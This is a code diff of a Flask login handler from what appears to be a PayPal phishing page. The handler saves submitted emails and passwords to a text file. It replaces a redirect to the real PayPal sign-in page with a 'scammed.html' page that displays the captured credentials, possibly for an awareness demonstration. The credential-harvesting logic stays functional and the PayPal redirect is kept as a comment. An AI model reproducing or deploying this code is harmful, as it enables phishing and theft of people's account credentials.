@@ -22,7 +22,9 @@ def login():
         email = request.form.get('email')      
         password = request.form.get('password')
         save_values_to_file(email,password)
-        return redirect("https://www.paypal.com/signin")
+        return render_template('scammed.html',email = email, password = password)
+    
+        #return redirect("https://www.paypal.com/signin")
     return render_template('login.html')
 
 def save_values_to_file(value1, value2, filename="output.txt"):
